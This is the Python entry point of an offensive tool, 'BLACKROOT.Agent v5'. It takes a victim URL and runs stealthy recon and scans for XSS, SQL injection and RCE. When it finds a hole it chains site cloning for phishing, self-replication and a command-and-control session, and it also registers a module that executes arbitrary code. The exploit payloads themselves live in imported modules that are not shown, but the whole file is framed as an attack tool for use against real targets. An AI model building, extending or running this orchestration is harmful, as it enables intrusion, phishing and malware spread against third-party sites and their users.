#!/usr/bin/env python3
"""
BLACKROOT.Agent v5 – Unified Entry Point
Shadow Intelligence Swarm
"""

import argparse
import json
import logging
import os
import sys
from datetime import datetime

# ---------- Path Hacks ----------
sys.path.insert(
    0,
    os.path.abspath(os.path.join(os.path.dirname(__file__),
                                 "assimilate/neuro-assimilator-enhanced/src"))
)

# ---------- External Imports ----------
from redis import Redis

# ---------- Internal Imports ----------
from kernel.core import BlackrootKernel, register_module
from assimilate.src.security.security_manager import SecurityManager
from assimilate.src.reliability.reliability_monitor import ReliabilityMonitor
from assimilate.src.performance.performance_profiler import PerformanceProfiler
from assimilate.src.extensibility.plugin_manager import PluginManager
from assimilate.src.rust_integration.rust_handler import RustScriptHandler
from recon.scanner import ReconModule
from mimic.site_cloner import clone_site
from core.dashboard import start_dashboard
from core.replication import begin_replication
from core.commander import initiate_c2_session
from assimilate.src.neuro_assimilator import NeuroAssimilatorAgent

# ---------- Logging Setup ----------
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(
            os.path.join(LOG_DIR,
                         f"blackroot_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.log")),
        logging.StreamHandler(sys.stdout)
    ]
)
log = logging.getLogger("blackroot")

# ---------- Helpers ----------
def load_config(path: str) -> dict:
    """Load and validate JSON config."""
    try:
        with open(path) as fp:
            cfg = json.load(fp)
        for k in ("black_vault", "swarm", "redis"):
            if k not in cfg:
                raise KeyError(k)
        return cfg
    except Exception as exc:
        log.error("Config error: %s", exc)
        sys.exit(2)

def redis_health_check(cfg: dict) -> Redis:
    """Return a live Redis client or exit."""
    try:
        r = Redis(
            host=cfg["redis"].get("host", "localhost"),
            port=cfg["redis"].get("port", 6379),
            socket_connect_timeout=2,
            decode_responses=True)
        r.ping()
        log.info("Redis OK")
        return r
    except Exception as exc:
        log.error("Redis unavailable: %s", exc)
        sys.exit(3)

# ---------- Main ----------
def main() -> None:
    banner = r"""
     ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ████████╗
    ██╔════╝ ██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
    ██║  ███╗██║     ███████║██║     █████╔╝ ██████╔╝██║   ██║██║   ██║   ██║
    ██║   ██║██║     ██╔══██║██║     ██╔═██╗ ██╔═══╝ ██║   ██║██║   ██║   ██║
    ╚██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝╚██████╔╝   ██║
     ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝  ╚═════╝    ╚═╝
             BLACKROOT.Agent v5 — Shadow Intelligence Swarm (Unified)
    """
    print(banner)

    parser = argparse.ArgumentParser(description="BLACKROOT.Agent v5 - Swarm Mode")
    parser.add_argument("--target", required=True,
                        help="Target URL (e.g., https://victim.com)")
    parser.add_argument("--silent", action="store_true",
                        help="Suppress cloner output")
    parser.add_argument("--config", default="config.json",
                        help="Path to JSON configuration")
    parser.add_argument("--stealth", action="store_true",
                        help="Minimize network noise")
    parser.add_argument("--no-dashboard", action="store_true",
                        help="Skip launching the web dashboard")
    parser.add_argument("--proxy", help="HTTP(S) proxy (e.g., http://127.0.0.1:8080)")
    args = parser.parse_args()

    log.info("Target acquired: %s", args.target)

    # ---------- Bootstrap ----------
    config = load_config(args.config)
    redis_client = redis_health_check(config)

    kernel = BlackrootKernel(config)

    # --- BlackVault list_artifacts monkey-patch ---
    if not hasattr(kernel.black_vault, "list_artifacts"):
        def _list_artifacts(self):
            # If black_vault wraps Redis, enumerate keys with a prefix, e.g.:
            return [k.decode() if isinstance(k, bytes) else k
                    for k in self.redis.keys("artifact:*")]

        # Bind it dynamically
        kernel.black_vault.list_artifacts = _list_artifacts.__get__(
            kernel.black_vault, kernel.black_vault.__class__)

    # ---------- Subsystems ----------
    subsystems = {
        "security_manager": SecurityManager(),
        "reliability_monitor": ReliabilityMonitor(),
        "performance_profiler": PerformanceProfiler(),
        "plugin_manager": PluginManager(manifest_path="/tmp/plugins.yaml"),
        "rust_handler": RustScriptHandler(),
        "recon_module": ReconModule(
            kernel.black_vault,
            kernel.swarm,
            redis_client
        )
    }

    # ---------- Global Registration ----------
    # Security: expects (code, signature)
    register_module(
        "security",
        lambda code, signature="": subsystems["security_manager"].analyze_and_execute(code, signature)
    )
    # Reliability: expects no arguments
    register_module(
        "reliability",
        lambda: subsystems["reliability_monitor"].rollback_codex()
    )
    # Performance: expects (cpu_usage, memory_usage, response_time)
    register_module(
        "performance",
        lambda cpu_usage, memory_usage, response_time: subsystems["performance_profiler"].log_performance(cpu_usage, memory_usage, response_time)
    )
    register_module("plugin", subsystems["plugin_manager"].register_plugin)
    register_module("rust", subsystems["rust_handler"].handle_rust_code)
    register_module("recon", subsystems["recon_module"].advanced_recon)

    # ---------- Reconnaissance ----------
    log.info("Beginning reconnaissance …")
    recon_report = subsystems["recon_module"].advanced_recon(
        args.target,
        stealth=args.stealth,
        proxy=args.proxy
    )
    endpoints = recon_report.get("endpoints", [])
    log.info("Recon found %d endpoints", len(endpoints))

    xss_results = subsystems["recon_module"].scan_for_xss(args.target, endpoints)
    sqli_results = recon_report.get("sqli", {})
    rce_results = recon_report.get("rce", {})

    # ---------- Exploitation Gate ----------
    if any((xss_results, sqli_results, rce_results)):
        log.info("Attack surface confirmed. Launching exploitation chain …")
        clone_site(args.target, silent=args.silent)
        begin_replication(args.target, config)
        initiate_c2_session()

        if not args.no_dashboard:
            start_dashboard()
    else:
        log.warning("No viable injection vectors found. Expand scan or import external exploits.")

    log.info("Run completed.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.warning("Interrupted by operator")
        sys.exit(0)